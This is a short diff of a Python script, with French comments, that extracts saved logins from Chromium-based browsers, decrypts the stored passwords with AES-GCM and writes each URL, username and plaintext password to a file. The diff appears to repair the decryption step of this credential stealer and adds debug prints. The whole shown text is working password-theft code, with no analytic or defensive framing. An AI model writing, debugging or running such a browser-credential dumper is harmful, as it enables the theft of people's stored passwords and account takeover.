@@ -2,7 +2,7 @@ import os, json, base64, shutil, sqlite3
 import ctypes
 import datetime
 import win32crypt
-from ctypes import c_void_p, c_char_p, c_uint, c_int, Structure, POINTER, byref
+from ctypes import c_void_p, c_uint, Structure, byref
 from Cryptodome.Cipher import AES
 
 try:
@@ -124,14 +124,18 @@ def dump_chromium_browser(browser_name, user_data_path):
                 url, username, enc_pwd = row
                 iv = enc_pwd[3:15]
                 payload = enc_pwd[15:]
-                cipher = AES.new(key, AES.MODE_GCM, iv)
-                decrypted = cipher.decrypt(payload[:-16]).decode()
+                #print(f"{user_data_path} - {enc_pwd} - {iv} - {payload} : len={len(enc_pwd)}")
+                ciphertext = payload[:-16]  # Le reste = données chiffrées
+                cipher = AES.new(key, AES.MODE_GCM, nonce=iv)
+                print(cipher)
+                decrypted = cipher.decrypt(ciphertext).decode()
                 out.write(f"{url} - {username} / {decrypted}\n")
+
         conn.close()
         out.close()
         os.remove(tmp_copy)
     except Exception as e:
-        print(f"Erreur de l'utilisateur : {e}")
+        print(f"Erreur de l'utilisateur ici: {e}")
 
 def dump_all_chromium():
     paths = {
